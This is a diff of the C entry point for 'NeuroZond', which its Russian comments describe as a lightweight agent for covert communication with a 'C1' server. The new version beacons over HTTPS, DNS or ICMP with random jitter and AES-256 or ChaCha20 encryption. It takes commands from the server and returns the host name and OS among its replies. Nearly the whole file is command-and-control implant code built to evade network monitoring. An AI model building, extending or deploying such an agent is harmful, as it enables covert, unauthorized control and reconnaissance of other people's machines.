@@ -1,384 +1,388 @@
 /**
  * @file main.c
- * @brief Основной файл для модуля скрытых каналов связи NeuroZond
- * @author iamtomasanderson@gmail.com
- * @date 2023-09-10
+ * @brief Основной файл для NeuroZond - легковесного агента для скрытой коммуникации
  *
- * Этот файл содержит основную функциональность для инициализации и управления
- * скрытыми каналами связи между зондом и сервером C1.
+ * @author iamtomasanderson@gmail.com
+ * @date 2023-09-03
  */
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <signal.h>
 #include <time.h>
-#include "network/covert_channel.h"
 
 #ifdef _WIN32
 #include <windows.h>
-#define sleep_ms(ms) Sleep(ms)
+#include <winsock2.h>
+#pragma comment(lib, "ws2_32.lib")
 #else
 #include <unistd.h>
-#define sleep_ms(ms) usleep(ms * 1000)
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #endif
 
-// Определение констант для конфигурации
-#define MAX_BUFFER_SIZE 4096
-#define DEFAULT_POLL_INTERVAL 10000  // 10 секунд в миллисекундах
-#define DEFAULT_RETRY_INTERVAL 60000 // 60 секунд в миллисекундах
-#define MAX_RETRIES 5
+#include "network/covert_channel.h"
 
-// Структура для хранения параметров командной строки
+#define VERSION "1.0.0"
+#define DEFAULT_CHANNEL_TYPE CHANNEL_TYPE_HTTPS
+#define DEFAULT_ENCRYPTION_TYPE ENCRYPTION_TYPE_AES256
+#define DEFAULT_BEACON_INTERVAL 60
+#define MAX_COMMAND_SIZE 4096
+
 typedef struct {
-    char* c1_server;
-    enum CovertChannelType primary_channel;
-    enum CovertChannelType fallback_channel;
-    enum EncryptionType encryption;
-    uint32_t min_jitter_ms;
-    uint32_t max_jitter_ms;
-    uint32_t poll_interval_ms;
-    uint32_t retry_interval_ms;
-    char* encryption_key;
-    int verbose;
-} cmd_params_t;
+    char c1_address[256];
+    int port;
+    ChannelType channel_type;
+    EncryptionType encryption_type;
+    int beacon_interval;
+    int jitter_percent;
+    int debug_mode;
+} ZondParams;
 
-// Инициализирует параметры командной строки значениями по умолчанию
-void init_params(cmd_params_t* params) {
-    if (!params) return;
-    
-    params->c1_server = NULL;
-    params->primary_channel = CHANNEL_TYPE_HTTPS;
-    params->fallback_channel = CHANNEL_TYPE_DNS;
-    params->encryption = ENCRYPTION_TYPE_AES256;
-    params->min_jitter_ms = 1000;
-    params->max_jitter_ms = 5000;
-    params->poll_interval_ms = DEFAULT_POLL_INTERVAL;
-    params->retry_interval_ms = DEFAULT_RETRY_INTERVAL;
-    params->encryption_key = NULL;
-    params->verbose = 0;
-}
+// Глобальные переменные
+static CovertChannelHandle channel = NULL;
+static int running = 1;
 
-// Вывод справки по использованию
-void print_usage(const char* program_name) {
-    printf("Использование: %s [опции]\n", program_name);
-    printf("Опции:\n");
-    printf("  -s, --server <адрес>       Адрес C1 сервера (обязательно)\n");
-    printf("  -p, --primary <тип>        Основной канал связи (https, dns, icmp) [по умолчанию: https]\n");
-    printf("  -f, --fallback <тип>       Резервный канал связи [по умолчанию: dns]\n");
-    printf("  -e, --encryption <тип>     Тип шифрования (none, xor, aes256, chacha20) [по умолчанию: aes256]\n");
-    printf("  -k, --key <ключ>           Ключ шифрования [по умолчанию: генерируется случайно]\n");
-    printf("  -j, --jitter <мин-макс>    Диапазон задержек в мс [по умолчанию: 1000-5000]\n");
-    printf("  -i, --interval <мс>        Интервал опроса сервера в мс [по умолчанию: 10000]\n");
-    printf("  -r, --retry <мс>           Интервал повторных попыток в мс [по умолчанию: 60000]\n");
-    printf("  -v, --verbose              Подробный вывод информации\n");
-    printf("  -h, --help                 Показать эту справку\n");
-}
-
-// Парсинг аргументов командной строки
-int parse_arguments(int argc, char* argv[], cmd_params_t* params) {
-    if (!params) return -1;
-    
-    for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--server") == 0) {
-            if (i + 1 < argc) params->c1_server = argv[++i];
-            else return -1;
-        }
-        else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--primary") == 0) {
-            if (i + 1 < argc) {
-                i++;
-                if (strcmp(argv[i], "https") == 0) params->primary_channel = CHANNEL_TYPE_HTTPS;
-                else if (strcmp(argv[i], "dns") == 0) params->primary_channel = CHANNEL_TYPE_DNS;
-                else if (strcmp(argv[i], "icmp") == 0) params->primary_channel = CHANNEL_TYPE_ICMP;
-                else return -1;
-            } else return -1;
-        }
-        else if (strcmp(argv[i], "-f") == 0 || strcmp(argv[i], "--fallback") == 0) {
-            if (i + 1 < argc) {
-                i++;
-                if (strcmp(argv[i], "https") == 0) params->fallback_channel = CHANNEL_TYPE_HTTPS;
-                else if (strcmp(argv[i], "dns") == 0) params->fallback_channel = CHANNEL_TYPE_DNS;
-                else if (strcmp(argv[i], "icmp") == 0) params->fallback_channel = CHANNEL_TYPE_ICMP;
-                else return -1;
-            } else return -1;
-        }
-        else if (strcmp(argv[i], "-e") == 0 || strcmp(argv[i], "--encryption") == 0) {
-            if (i + 1 < argc) {
-                i++;
-                if (strcmp(argv[i], "none") == 0) params->encryption = ENCRYPTION_TYPE_NONE;
-                else if (strcmp(argv[i], "xor") == 0) params->encryption = ENCRYPTION_TYPE_XOR;
-                else if (strcmp(argv[i], "aes256") == 0) params->encryption = ENCRYPTION_TYPE_AES256;
-                else if (strcmp(argv[i], "chacha20") == 0) params->encryption = ENCRYPTION_TYPE_CHACHA20;
-                else return -1;
-            } else return -1;
-        }
-        else if (strcmp(argv[i], "-k") == 0 || strcmp(argv[i], "--key") == 0) {
-            if (i + 1 < argc) params->encryption_key = argv[++i];
-            else return -1;
-        }
-        else if (strcmp(argv[i], "-j") == 0 || strcmp(argv[i], "--jitter") == 0) {
-            if (i + 1 < argc) {
-                char* jitter_range = argv[++i];
-                char* dash = strchr(jitter_range, '-');
-                if (dash) {
-                    *dash = '\0';
-                    params->min_jitter_ms = atoi(jitter_range);
-                    params->max_jitter_ms = atoi(dash + 1);
-                } else return -1;
-            } else return -1;
-        }
-        else if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--interval") == 0) {
-            if (i + 1 < argc) params->poll_interval_ms = atoi(argv[++i]);
-            else return -1;
-        }
-        else if (strcmp(argv[i], "-r") == 0 || strcmp(argv[i], "--retry") == 0) {
-            if (i + 1 < argc) params->retry_interval_ms = atoi(argv[++i]);
-            else return -1;
-        }
-        else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
-            params->verbose = 1;
-        }
-        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
-            print_usage(argv[0]);
-            return 1;
-        }
-        else {
-            return -1;
-        }
+/**
+ * @brief Инициализация параметров с значениями по умолчанию
+ * 
+ * @param params структура параметров для инициализации
+ */
+void init_params(ZondParams *params) {
+    if (params == NULL) {
+        return;
     }
-    
-    // Проверка наличия обязательных параметров
-    if (!params->c1_server) {
-        printf("Ошибка: не указан адрес C1 сервера\n");
+
+    memset(params, 0, sizeof(ZondParams));
+    strcpy(params->c1_address, "127.0.0.1");
+    params->port = 443;
+    params->channel_type = DEFAULT_CHANNEL_TYPE;
+    params->encryption_type = DEFAULT_ENCRYPTION_TYPE;
+    params->beacon_interval = DEFAULT_BEACON_INTERVAL;
+    params->jitter_percent = 15; // 15% jitter по умолчанию
+    params->debug_mode = 0;
+}
+
+/**
+ * @brief Обработчик сигналов для корректного завершения работы
+ */
+void signal_handler(int signal) {
+    printf("Получен сигнал %d, завершение работы...\n", signal);
+    running = 0;
+}
+
+/**
+ * @brief Парсинг аргументов командной строки
+ * 
+ * @param argc количество аргументов
+ * @param argv массив аргументов
+ * @param params параметры для заполнения
+ * @return int 0 при успешном парсинге, -1 при ошибке
+ */
+int parse_arguments(int argc, char *argv[], ZondParams *params) {
+    if (params == NULL) {
         return -1;
     }
-    
-    // Генерация случайного ключа, если не указан
-    if (!params->encryption_key && params->encryption != ENCRYPTION_TYPE_NONE) {
-        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        int key_length = 0;
-        
-        switch (params->encryption) {
-            case ENCRYPTION_TYPE_XOR:     key_length = 16; break;
-            case ENCRYPTION_TYPE_AES256:  key_length = 32; break;
-            case ENCRYPTION_TYPE_CHACHA20: key_length = 32; break;
-            default: key_length = 16;
-        }
-        
-        params->encryption_key = (char*)malloc(key_length + 1);
-        if (!params->encryption_key) {
-            printf("Ошибка: не удалось выделить память для ключа\n");
+
+    // Инициализация параметров значениями по умолчанию
+    init_params(params);
+
+    for (int i = 1; i < argc; i++) {
+        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
+            printf("NeuroZond v%s - Легковесный агент для скрытой коммуникации\n", VERSION);
+            printf("Использование: %s [опции]\n", argv[0]);
+            printf("Опции:\n");
+            printf("  -h, --help                 Показать эту справку\n");
+            printf("  -a, --address <addr>       Адрес C1 сервера (по умолчанию: 127.0.0.1)\n");
+            printf("  -p, --port <port>          Порт сервера (по умолчанию: 443)\n");
+            printf("  -c, --channel <type>       Тип канала связи: dns, https, icmp (по умолчанию: https)\n");
+            printf("  -e, --encryption <type>    Тип шифрования: xor, aes256, chacha20 (по умолчанию: aes256)\n");
+            printf("  -b, --beacon <seconds>     Интервал проверки команд в секундах (по умолчанию: 60)\n");
+            printf("  -j, --jitter <percent>     Процент случайного отклонения от интервала (по умолчанию: 15)\n");
+            printf("  -d, --debug                Включить режим отладки\n");
+            return -1;
+        } else if ((strcmp(argv[i], "-a") == 0 || strcmp(argv[i], "--address") == 0) && i + 1 < argc) {
+            strncpy(params->c1_address, argv[++i], sizeof(params->c1_address) - 1);
+        } else if ((strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) && i + 1 < argc) {
+            params->port = atoi(argv[++i]);
+        } else if ((strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--channel") == 0) && i + 1 < argc) {
+            i++;
+            if (strcmp(argv[i], "dns") == 0) {
+                params->channel_type = CHANNEL_TYPE_DNS;
+            } else if (strcmp(argv[i], "https") == 0) {
+                params->channel_type = CHANNEL_TYPE_HTTPS;
+            } else if (strcmp(argv[i], "icmp") == 0) {
+                params->channel_type = CHANNEL_TYPE_ICMP;
+            } else {
+                fprintf(stderr, "Неизвестный тип канала: %s\n", argv[i]);
+                return -1;
+            }
+        } else if ((strcmp(argv[i], "-e") == 0 || strcmp(argv[i], "--encryption") == 0) && i + 1 < argc) {
+            i++;
+            if (strcmp(argv[i], "xor") == 0) {
+                params->encryption_type = ENCRYPTION_TYPE_XOR;
+            } else if (strcmp(argv[i], "aes256") == 0) {
+                params->encryption_type = ENCRYPTION_TYPE_AES256;
+            } else if (strcmp(argv[i], "chacha20") == 0) {
+                params->encryption_type = ENCRYPTION_TYPE_CHACHA20;
+            } else {
+                fprintf(stderr, "Неизвестный тип шифрования: %s\n", argv[i]);
+                return -1;
+            }
+        } else if ((strcmp(argv[i], "-b") == 0 || strcmp(argv[i], "--beacon") == 0) && i + 1 < argc) {
+            params->beacon_interval = atoi(argv[++i]);
+            if (params->beacon_interval < 10) {
+                fprintf(stderr, "Интервал проверки должен быть не менее 10 секунд\n");
+                return -1;
+            }
+        } else if ((strcmp(argv[i], "-j") == 0 || strcmp(argv[i], "--jitter") == 0) && i + 1 < argc) {
+            params->jitter_percent = atoi(argv[++i]);
+            if (params->jitter_percent < 0 || params->jitter_percent > 50) {
+                fprintf(stderr, "Процент jitter должен быть от 0 до 50\n");
+                return -1;
+            }
+        } else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--debug") == 0) {
+            params->debug_mode = 1;
+        } else {
+            fprintf(stderr, "Неизвестная опция: %s\n", argv[i]);
             return -1;
         }
-        
-        for (int i = 0; i < key_length; i++) {
-            int index = rand() % (sizeof(charset) - 1);
-            params->encryption_key[i] = charset[index];
-        }
-        params->encryption_key[key_length] = '\0';
-        
-        if (params->verbose) {
-            printf("[+] Сгенерирован случайный ключ: %s\n", params->encryption_key);
-        }
     }
-    
+
     return 0;
 }
 
-// Создание и инициализация канала связи
-covert_channel_handle_t create_channel(const cmd_params_t* params, enum CovertChannelType channel_type) {
-    if (!params) return NULL;
-    
-    // Создание конфигурации канала
-    void* channel_config = NULL;
-    
-    // Инициализация канала
-    covert_channel_handle_t handle = NULL;
-    int result = covert_channel_init(&handle, channel_type, params->c1_server, channel_config);
-    
-    if (result != 0) {
-        if (params->verbose) {
-            printf("[-] Ошибка инициализации канала (тип %d): %d\n", channel_type, result);
-        }
+/**
+ * @brief Создание канала связи на основе параметров
+ * 
+ * @param params параметры конфигурации
+ * @return CovertChannelHandle дескриптор канала или NULL при ошибке
+ */
+CovertChannelHandle create_channel(const ZondParams *params) {
+    if (params == NULL) {
         return NULL;
     }
+
+    CovertChannelConfig config;
+    memset(&config, 0, sizeof(CovertChannelConfig));
     
-    // Установка параметров джиттера
-    if (params->min_jitter_ms > 0 || params->max_jitter_ms > 0) {
-        result = covert_channel_set_jitter(handle, params->min_jitter_ms, params->max_jitter_ms);
-        if (result != 0 && params->verbose) {
-            printf("[-] Ошибка установки параметров джиттера: %d\n", result);
-        }
+    config.channel_type = params->channel_type;
+    config.encryption_type = params->encryption_type;
+    strncpy(config.server_addr, params->c1_address, sizeof(config.server_addr) - 1);
+    config.server_port = params->port;
+    config.jitter_percent = params->jitter_percent;
+    config.debug_mode = params->debug_mode;
+    
+    // Инициализация ключа шифрования (в реальном приложении должен быть получен безопасно)
+    unsigned char key[32] = {0};
+    memset(key, 0x42, sizeof(key)); // Использование простого ключа для демонстрации
+    memcpy(config.encryption_key, key, sizeof(config.encryption_key));
+
+    CovertChannelHandle handle = covert_channel_init(&config);
+    if (handle == NULL) {
+        fprintf(stderr, "Ошибка при инициализации канала связи\n");
+        return NULL;
     }
-    
+
+    if (covert_channel_connect(handle) != 0) {
+        fprintf(stderr, "Ошибка при установлении соединения с C1 сервером\n");
+        covert_channel_cleanup(handle);
+        return NULL;
+    }
+
     return handle;
 }
 
-// Основной цикл работы
-int main_loop(const cmd_params_t* params) {
-    if (!params) return -1;
-    
-    covert_channel_handle_t primary_channel = NULL;
-    covert_channel_handle_t fallback_channel = NULL;
-    covert_channel_handle_t active_channel = NULL;
-    int retry_count = 0;
-    int result = 0;
-    uint8_t buffer[MAX_BUFFER_SIZE];
-    size_t bytes_received = 0;
-    
-    // Инициализация модуля скрытых каналов
-    result = covert_channel_module_init();
-    if (result != 0) {
-        printf("[-] Ошибка инициализации модуля скрытых каналов: %d\n", result);
+/**
+ * @brief Обработка полученной команды
+ * 
+ * @param command строка с командой
+ * @param response буфер для ответа
+ * @param max_response_size максимальный размер буфера ответа
+ * @return int размер ответа или -1 при ошибке
+ */
+int process_command(const char *command, char *response, size_t max_response_size) {
+    if (command == NULL || response == NULL || max_response_size == 0) {
+        return -1;
+    }
+
+    // Простой обработчик команд для демонстрации
+    if (strncmp(command, "ping", 4) == 0) {
+        snprintf(response, max_response_size, "pong");
+        return 4;
+    } else if (strncmp(command, "version", 7) == 0) {
+        snprintf(response, max_response_size, "NeuroZond v%s", VERSION);
+        return strlen(response);
+    } else if (strncmp(command, "sysinfo", 7) == 0) {
+        char hostname[256] = {0};
+#ifdef _WIN32
+        DWORD size = sizeof(hostname);
+        GetComputerNameA(hostname, &size);
+#else
+        gethostname(hostname, sizeof(hostname));
+#endif
+        snprintf(response, max_response_size, "Host: %s, OS: %s", 
+                hostname, 
+#ifdef _WIN32
+                "Windows"
+#else
+                "Unix/Linux"
+#endif
+        );
+        return strlen(response);
+    } else if (strncmp(command, "exit", 4) == 0) {
+        running = 0;
+        snprintf(response, max_response_size, "Завершение работы");
+        return strlen(response);
+    } else {
+        snprintf(response, max_response_size, "Неизвестная команда: %s", command);
+        return strlen(response);
+    }
+}
+
+/**
+ * @brief Основной цикл работы агента
+ * 
+ * @param params параметры конфигурации
+ * @return int 0 при успешном выполнении, -1 при ошибке
+ */
+int main_loop(const ZondParams *params) {
+    if (params == NULL || channel == NULL) {
         return -1;
     }
     
-    if (params->verbose) {
-        printf("[+] Модуль скрытых каналов успешно инициализирован\n");
-    }
+    char command[MAX_COMMAND_SIZE] = {0};
+    char response[MAX_COMMAND_SIZE] = {0};
+    int recv_size, send_size;
     
-    // Создание основного канала
-    primary_channel = create_channel(params, params->primary_channel);
-    if (!primary_channel) {
-        printf("[-] Не удалось создать основной канал связи\n");
+    // Отправка информации о запуске агента
+    snprintf(response, sizeof(response), "NeuroZond v%s запущен. Канал: %d, Шифрование: %d", 
+            VERSION, params->channel_type, params->encryption_type);
+    
+    if (covert_channel_send(channel, response, strlen(response)) < 0) {
+        fprintf(stderr, "Ошибка при отправке сообщения о запуске\n");
         return -1;
     }
     
-    if (params->verbose) {
-        printf("[+] Основной канал связи создан (тип %d)\n", params->primary_channel);
-    }
-    
-    // Создание резервного канала (если отличается от основного)
-    if (params->fallback_channel != params->primary_channel) {
-        fallback_channel = create_channel(params, params->fallback_channel);
-        if (fallback_channel && params->verbose) {
-            printf("[+] Резервный канал связи создан (тип %d)\n", params->fallback_channel);
+    while (running) {
+        // Добавление случайной задержки (jitter)
+        int jitter = 0;
+        if (params->jitter_percent > 0) {
+            jitter = (rand() % (2 * params->jitter_percent + 1)) - params->jitter_percent;
         }
-    }
-    
-    // Устанавливаем активный канал
-    active_channel = primary_channel;
-    
-    // Основной цикл работы
-    while (1) {
-        // Попытка подключения по активному каналу
-        result = covert_channel_connect(active_channel);
-        if (result != 0) {
-            if (params->verbose) {
-                printf("[-] Ошибка подключения по активному каналу: %d\n", result);
+        int sleep_time = params->beacon_interval * (100 + jitter) / 100;
+        
+        if (params->debug_mode) {
+            printf("Ожидание %d секунд до следующего запроса...\n", sleep_time);
+        }
+        
+#ifdef _WIN32
+        Sleep(sleep_time * 1000);
+#else
+        sleep(sleep_time);
+#endif
+        
+        // Очистка буферов
+        memset(command, 0, sizeof(command));
+        memset(response, 0, sizeof(response));
+        
+        // Запрос команды от C1
+        recv_size = covert_channel_receive(channel, command, sizeof(command) - 1);
+        if (recv_size < 0) {
+            if (params->debug_mode) {
+                fprintf(stderr, "Ошибка при получении команды\n");
             }
-            
-            retry_count++;
-            
-            // Переключение на резервный канал при необходимости
-            if (fallback_channel && active_channel == primary_channel) {
-                if (params->verbose) {
-                    printf("[*] Переключение на резервный канал\n");
-                }
-                active_channel = fallback_channel;
-                retry_count = 0;
+            continue;
+        } else if (recv_size == 0) {
+            // Нет новых команд
+            if (params->debug_mode) {
+                printf("Нет новых команд\n");
             }
-            // Превышено количество попыток
-            else if (retry_count >= MAX_RETRIES) {
-                if (params->verbose) {
-                    printf("[-] Превышено количество попыток подключения\n");
-                }
-                // Возвращаемся к основному каналу
-                active_channel = primary_channel;
-                retry_count = 0;
-                
-                // Ожидание перед следующей попыткой
-                sleep_ms(params->retry_interval_ms);
-                continue;
-            }
-            
-            // Ожидание перед следующей попыткой
-            sleep_ms(params->retry_interval_ms);
             continue;
         }
         
-        if (params->verbose) {
-            printf("[+] Подключение установлено\n");
+        if (params->debug_mode) {
+            printf("Получена команда [%d байт]: %s\n", recv_size, command);
         }
         
-        // Сброс счетчика попыток
-        retry_count = 0;
-        
-        // Получение данных от сервера
-        memset(buffer, 0, MAX_BUFFER_SIZE);
-        result = covert_channel_receive(active_channel, buffer, MAX_BUFFER_SIZE, &bytes_received);
-        
-        if (result == 0 && bytes_received > 0) {
-            if (params->verbose) {
-                printf("[+] Получено %zu байт данных\n", bytes_received);
+        // Обработка команды
+        send_size = process_command(command, response, sizeof(response) - 1);
+        if (send_size <= 0) {
+            if (params->debug_mode) {
+                fprintf(stderr, "Ошибка при обработке команды\n");
             }
-            
-            // Здесь обработка полученных данных
-            // ...
-            
-            // Отправка подтверждения
-            const char* ack_message = "ACK";
-            size_t bytes_sent = 0;
-            result = covert_channel_send(active_channel, (const uint8_t*)ack_message, strlen(ack_message));
-            
-            if (result != 0 && params->verbose) {
-                printf("[-] Ошибка отправки подтверждения: %d\n", result);
-            }
-        }
-        else if (result != 0 && params->verbose) {
-            printf("[-] Ошибка получения данных: %d\n", result);
+            continue;
         }
         
-        // Пауза перед следующим опросом
-        sleep_ms(params->poll_interval_ms);
-    }
-    
-    // Очистка ресурсов (этот код никогда не будет выполнен, так как цикл бесконечный)
-    if (primary_channel) {
-        covert_channel_cleanup(primary_channel);
-    }
-    
-    if (fallback_channel) {
-        covert_channel_cleanup(fallback_channel);
+        // Отправка ответа
+        if (covert_channel_send(channel, response, send_size) < 0) {
+            if (params->debug_mode) {
+                fprintf(stderr, "Ошибка при отправке ответа\n");
+            }
+        } else if (params->debug_mode) {
+            printf("Отправлен ответ [%d байт]: %s\n", send_size, response);
+        }
     }
     
     return 0;
 }
 
-int main(int argc, char* argv[]) {
+/**
+ * @brief Точка входа в программу
+ */
+int main(int argc, char *argv[]) {
     // Инициализация генератора случайных чисел
     srand((unsigned int)time(NULL));
     
-    // Инициализация параметров
-    cmd_params_t params;
-    init_params(&params);
+    // Настройка обработчиков сигналов
+    signal(SIGINT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    
+#ifdef _WIN32
+    // Инициализация WSA для Windows
+    WSADATA wsa_data;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
+        fprintf(stderr, "Ошибка инициализации WSA\n");
+        return EXIT_FAILURE;
+    }
+#endif
     
     // Парсинг аргументов командной строки
-    int result = parse_arguments(argc, argv, &params);
-    if (result != 0) {
-        if (result < 0) {
-            printf("Ошибка в параметрах командной строки\n");
-            print_usage(argv[0]);
-        }
-        return (result < 0) ? 1 : 0;
+    ZondParams params;
+    if (parse_arguments(argc, argv, &params) != 0) {
+        return EXIT_FAILURE;
     }
     
-    if (params.verbose) {
-        printf("[*] NeuroZond скрытый канал связи\n");
-        printf("[*] Сервер C1: %s\n", params.c1_server);
-        printf("[*] Основной канал: %d, Резервный канал: %d\n", params.primary_channel, params.fallback_channel);
-        printf("[*] Шифрование: %d\n", params.encryption);
-        printf("[*] Диапазон джиттера: %d-%d мс\n", params.min_jitter_ms, params.max_jitter_ms);
-        printf("[*] Интервал опроса: %d мс\n", params.poll_interval_ms);
-        printf("[*] Интервал повторных попыток: %d мс\n", params.retry_interval_ms);
+    if (params.debug_mode) {
+        printf("NeuroZond v%s запускается с параметрами:\n", VERSION);
+        printf("C1 адрес: %s:%d\n", params.c1_address, params.port);
+        printf("Тип канала: %d\n", params.channel_type);
+        printf("Тип шифрования: %d\n", params.encryption_type);
+        printf("Интервал проверки: %d сек\n", params.beacon_interval);
+        printf("Jitter: %d%%\n", params.jitter_percent);
+    }
+    
+    // Создание канала связи
+    channel = create_channel(&params);
+    if (channel == NULL) {
+        fprintf(stderr, "Не удалось создать канал связи\n");
+        return EXIT_FAILURE;
     }
     
     // Запуск основного цикла
-    result = main_loop(&params);
+    int result = main_loop(&params);
     
-    // Освобождение памяти
-    if (params.encryption_key && params.encryption != ENCRYPTION_TYPE_NONE) {
-        free(params.encryption_key);
+    // Очистка ресурсов
+    if (channel != NULL) {
+        covert_channel_cleanup(channel);
+        channel = NULL;
     }
     
-    return (result != 0) ? 1 : 0;
+#ifdef _WIN32
+    WSACleanup();
+#endif
+    
+    return (result == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
 } 
